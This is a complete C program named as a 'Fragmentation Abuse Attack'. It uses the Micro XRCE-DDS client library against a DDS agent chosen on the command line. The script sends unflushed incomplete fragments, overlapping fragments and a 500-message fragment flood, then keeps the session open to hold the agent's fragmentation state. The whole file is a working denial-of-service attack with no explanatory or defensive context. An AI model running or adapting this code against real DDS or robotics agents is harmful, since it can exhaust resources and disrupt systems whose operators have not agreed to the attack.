// Compile: gcc attack_fragment_abuse.c -o fragment_abuse -lmicroxrcedds_client -lmicrocdr
#include <uxr/client/client.h>
#include <ucdr/microcdr.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define STREAM_HISTORY 4
#define SMALL_BUFFER_SIZE 256 * STREAM_HISTORY
#define HUGE_MESSAGE_SIZE 32000

bool flush_session(uxrSession *session, void *args)
{
    (void) args;
    return uxr_run_session_until_confirm_delivery(session, 1000);
}

void send_incomplete_fragments(uxrSession *session, uxrStreamId stream, uxrObjectId datawriter)
{
    printf("[*] Sending incomplete fragments...\n");

    ucdrBuffer mb;

    uint16_t req_id = uxr_prepare_output_stream_fragmented(session, stream, datawriter, &mb, HUGE_MESSAGE_SIZE,
                                                           flush_session, NULL);

    if (req_id != UXR_INVALID_REQUEST_ID)
    {
        for (int i = 0; i < 8000; i++)
        {
            ucdr_serialize_uint32_t(&mb, 0x46464646);
        }

        printf("[+] Incomplete fragments sent (NOT flushed)\n");
    }
}

void send_overlapping_fragments(uxrSession *session, uxrStreamId stream, uxrObjectId datawriter)
{
    printf("[*] Attempting overlapping fragment attack...\n");

    for (int i = 0; i < 10; i++)
    {
        ucdrBuffer mb;
        uint32_t size = HUGE_MESSAGE_SIZE / 2;

        uint16_t req_id = uxr_prepare_output_stream_fragmented(session, stream, datawriter, &mb, size,
                                                               flush_session, NULL);

        if (req_id != UXR_INVALID_REQUEST_ID)
        {
            char msg[100];
            snprintf(msg, sizeof(msg), "OVERLAPPING_FRAGMENT_%d", i);

            uint8_t data[HUGE_MESSAGE_SIZE / 2] = {0};
            ucdrBuffer db;
            ucdr_init_buffer(&db, data, size);

            for (int j = 0; j < 200; j++)
            {
                ucdr_serialize_string(&db, msg);
            }

            ucdr_serialize_array_uint8_t(&mb, data, size);

            if (i % 3 == 0)
            {
                uxr_run_session_time(session, 10);
            }
        }
    }

    printf("[+] Overlapping fragments sent\n");
}

void flood_with_fragments(uxrSession *session, uxrStreamId stream, uxrObjectId datawriter, int count)
{
    printf("[*] Flooding with %d fragmented messages...\n", count);

    for (int i = 0; i < count; i++)
    {
        ucdrBuffer mb;
        uint32_t size = HUGE_MESSAGE_SIZE / 4;

        uint16_t req_id = uxr_prepare_output_stream_fragmented(session, stream, datawriter, &mb, size,
                                                               flush_session, NULL);

        if (req_id != UXR_INVALID_REQUEST_ID)
        {
            char msg[100];
            snprintf(msg, sizeof(msg), "FLOOD_MESSAGE_%d", i);

            uint8_t data[HUGE_MESSAGE_SIZE / 4] = {0};
            ucdrBuffer db;
            ucdr_init_buffer(&db, data, size);

            for (int j = 0; j < 100; j++)
            {
                ucdr_serialize_string(&db, msg);
            }

            ucdr_serialize_array_uint8_t(&mb, data, size);
        }

        if (i % 10 == 0)
        {
            printf("[+] Sent %d fragmented messages\n", i);
        }

        usleep(1000);
    }

    printf("[+] Fragment flood completed\n");
}

int main(int argc, char **argv)
{
    if (argc != 3)
    {
        printf("Usage: %s <agent_ip> <agent_port>\n", argv[0]);
        return 1;
    }

    char *ip = argv[1];
    char *port = argv[2];

    printf("=== Fragmentation Abuse Attack ===\n");
    printf("Target: %s:%s\n\n", ip, port);

    uxrUDPTransport transport;
    if (!uxr_init_udp_transport(&transport, UXR_IPv4, ip, port))
    {
        printf("[-] Failed to init transport\n");
        return 1;
    }

    uxrSession session;
    uxr_init_session(&session, &transport.comm, 0xFFFF1234);

    if (!uxr_create_session(&session))
    {
        printf("[-] Failed to create session\n");
        return 1;
    }

    printf("[+] Session created\n");

    uint8_t output_buffer[SMALL_BUFFER_SIZE];
    uxrStreamId reliable_out = uxr_create_output_reliable_stream(&session, output_buffer,
                                                                 SMALL_BUFFER_SIZE, STREAM_HISTORY);

    uint8_t input_buffer[SMALL_BUFFER_SIZE];
    uxr_create_input_reliable_stream(&session, input_buffer, SMALL_BUFFER_SIZE, STREAM_HISTORY);

    uxrObjectId participant_id = uxr_object_id(0x01, UXR_PARTICIPANT_ID);
    const char *participant_xml = "<dds><participant><rtps><name>fragment_attacker</name></rtps></participant></dds>";
    uxr_buffer_create_participant_xml(&session, reliable_out, participant_id, 0, participant_xml, UXR_REPLACE);

    uxrObjectId topic_id = uxr_object_id(0x01, UXR_TOPIC_ID);
    const char *topic_xml = "<dds><topic><name>HelloWorldTopic</name><dataType>HelloWorld</dataType></topic></dds>";
    uxr_buffer_create_topic_xml(&session, reliable_out, topic_id, participant_id, topic_xml, UXR_REPLACE);

    uxrObjectId publisher_id = uxr_object_id(0x01, UXR_PUBLISHER_ID);
    uxr_buffer_create_publisher_xml(&session, reliable_out, publisher_id, participant_id, "", UXR_REPLACE);

    uxrObjectId datawriter_id = uxr_object_id(0x01, UXR_DATAWRITER_ID);
    const char *datawriter_xml = "<dds><data_writer><topic><kind>NO_KEY</kind><name>HelloWorldTopic</name><dataType>HelloWorld</dataType></topic></data_writer></dds>";
    uxr_buffer_create_datawriter_xml(&session, reliable_out, datawriter_id, publisher_id,
                                     datawriter_xml, UXR_REPLACE);

    printf("[*] Waiting for entity creation...\n");
    uxr_run_session_until_confirm_delivery(&session, 2000);

    printf("\n[*] Starting fragmentation attacks...\n\n");

    for (int i = 0; i < 50; i++)
    {
        send_incomplete_fragments(&session, reliable_out, datawriter_id);
        usleep(100000);
    }

    for (int i = 0; i < 20; i++)
    {
        send_overlapping_fragments(&session, reliable_out, datawriter_id);
        usleep(500000);
    }

    flood_with_fragments(&session, reliable_out, datawriter_id, 500);

    printf("\n[*] Keeping session alive to maintain fragmentation state...\n");
    uxr_run_session_time(&session, 60000);

    printf("\n[*] Attack completed\n");

    uxr_delete_session(&session);
    uxr_close_udp_transport(&transport);

    return 0;
}
